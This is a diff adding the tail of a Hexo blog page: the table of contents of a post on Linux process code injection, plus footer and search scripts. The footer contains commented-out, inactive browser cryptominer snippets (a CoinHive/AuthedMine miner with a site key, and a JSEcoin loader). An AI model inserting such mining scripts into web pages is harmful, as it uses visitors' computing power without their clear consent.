+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#应用场景"><span class="nav-number">2.</span> <span class="nav-text">应用场景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在linux中进行进程调试"><span class="nav-number">3.</span> <span class="nav-text">在linux中进行进程调试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#附加到正在运行的进程"><span class="nav-number">4.</span> <span class="nav-text">附加到正在运行的进程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注入代码"><span class="nav-number">5.</span> <span class="nav-text">注入代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取寄存器和内存信息"><span class="nav-number">6.</span> <span class="nav-text">获取寄存器和内存信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#运行注入代码"><span class="nav-number">7.</span> <span class="nav-text">运行注入代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如何去算出这两个字节"><span class="nav-number">8.</span> <span class="nav-text">如何去算出这两个字节</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#测试程序"><span class="nav-number">9.</span> <span class="nav-text">测试程序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#结束语"><span class="nav-number">10.</span> <span class="nav-text">结束语</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其它"><span class="nav-number">11.</span> <span class="nav-text">其它</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#20180320更新"><span class="nav-number">12.</span> <span class="nav-text">20180320更新</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M0rk</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+<br>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<!--
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+-->
+<!--
+<script type="text/javascript">
+!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/39357/kevien.github.io/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
+</script>
+-->
+
+<!--
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('uTu9h9LT1kVUk4O1UxyZAhd8uvoLLip5', {throttle: 0.3});
+
+  // Only start on non-mobile devices and if not opted-out
+  // in the last 14400 seconds (4 hours):
+  if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    miner.start();
+  }
+</script>
+-->
+
+
+<!--<script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="https://kevien.github.io/static/api/js/canvas-nest.min.js"></script>-->
+<script src="https://kevien.github.io/static/api/js/love.js"></script>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+     <!-- 来必力City版安装代码 -->
+     <!--
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yOTU4MS82MTQ5">
+        <script type="text/javascript">
+         (function(d, s) {
+             var j, e = d.getElementsByTagName(s)[0];
+
+             if (typeof LivereTower === 'function') { return; }
+
+             j = d.createElement(s);
+             j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+             j.async = true;
+
+             e.parentNode.insertBefore(j, e);
+         })(document, 'script');
+        </script>
+      <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+      </div>
+      -->
+<!-- City版安装代码已完成 -->
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      $('#local-search-input').focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
